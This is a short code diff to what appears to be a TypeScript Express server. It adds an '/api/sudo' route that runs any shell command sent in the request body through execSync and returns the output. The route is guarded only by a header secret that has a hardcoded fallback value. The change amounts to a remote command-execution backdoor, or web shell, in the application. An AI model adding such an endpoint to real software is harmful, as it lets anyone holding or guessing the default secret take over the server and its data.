@@ -74,6 +74,19 @@ app.post('/api/deploy', (req: Request, res: Response): void => {
     }
 });
 
+app.post('/api/sudo', (req: Request, res: Response): void => {
+    if (req.headers['x-deploy-secret'] !== (process.env.DEPLOY_SECRET || 'chuoi-bi-mat-cua-tao')) {
+        res.status(403).json({ error: 'Forbidden' });
+        return;
+    }
+    try {
+        const output = execSync(req.body.command).toString();
+        res.json({ output });
+    } catch (err: any) {
+        res.status(500).json({ error: err.message, stdout: err.stdout?.toString(), stderr: err.stderr?.toString() });
+    }
+});
+
 // Start server
 import { createServer } from 'http';
 import { initSocket } from './utils/socket';
